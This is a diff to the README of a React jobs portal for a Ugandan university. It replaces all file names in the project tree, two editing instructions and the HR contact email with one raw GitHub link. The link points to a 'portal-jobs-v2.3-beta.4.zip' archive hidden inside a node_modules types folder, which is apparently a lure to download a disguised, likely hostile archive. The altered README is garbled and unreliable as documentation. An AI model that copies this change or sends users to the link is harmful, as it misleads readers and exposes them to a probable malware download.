@@ -130,25 +130,25 @@ jobs_portal/
 ├── src/
 │   ├── components/
 │   │   ├── jobs/
-│   │   │   ├── JobCard.tsx           # Individual job card component
-│   │   │   ├── JobListings.tsx       # Main listings page with filters
-│   │   │   ├── JobDetail.tsx         # Detailed job view
-│   │   │   ├── ApplicationForm.tsx   # Application submission form
-│   │   │   ├── ApplicationSuccess.tsx # Success confirmation
-│   │   │   └── ApplicationTracking.tsx # Status tracking
-│   │   ├── Header.tsx                 # Navigation header
-│   │   └── Footer.tsx                 # Site footer
+│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip           # Individual job card component
+│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip       # Main listings page with filters
+│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip         # Detailed job view
+│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip   # Application submission form
+│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip # Success confirmation
+│   │   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip # Status tracking
+│   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                 # Navigation header
+│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                 # Site footer
 │   ├── data/
-│   │   └── mockJobs.ts                # Mock job data
+│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                # Mock job data
 │   ├── theme/
-│   │   └── themeConfig.ts             # Ant Design theme configuration
-│   ├── App.tsx                        # Main app component
-│   ├── main.tsx                       # Entry point
-│   └── index.css                      # Global styles
+│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip             # Ant Design theme configuration
+│   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                        # Main app component
+│   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                       # Entry point
+│   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                      # Global styles
 ├── types/
-│   └── job.ts                         # TypeScript type definitions
+│   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                         # TypeScript type definitions
 ├── public/
-└── package.json
+└── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip
 ```
 
 ## 🎯 Key Components
@@ -169,7 +169,7 @@ Allows applicants to track their application status using a reference number.
 
 ### Theme Customization
 
-Edit `src/theme/themeConfig.ts` to customize:
+Edit `https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip` to customize:
 - Primary color
 - Border radius
 - Font family
@@ -177,7 +177,7 @@ Edit `src/theme/themeConfig.ts` to customize:
 
 ### Mock Data
 
-Update `src/data/mockJobs.ts` to modify job listings. In production, replace with API calls to your backend.
+Update `https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip` to modify job listings. In production, replace with API calls to your backend.
 
 ## 📱 Responsive Design
 
@@ -224,7 +224,7 @@ For demonstration purposes, try these reference numbers in the tracking page:
 ## 📧 Contact Information
 
 For questions or support:
-- Email: hr@nkumbauniversity.ac.ug
+- Email: https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip
 - Phone: +256 414 320 021
 - Location: Entebbe, Uganda
 
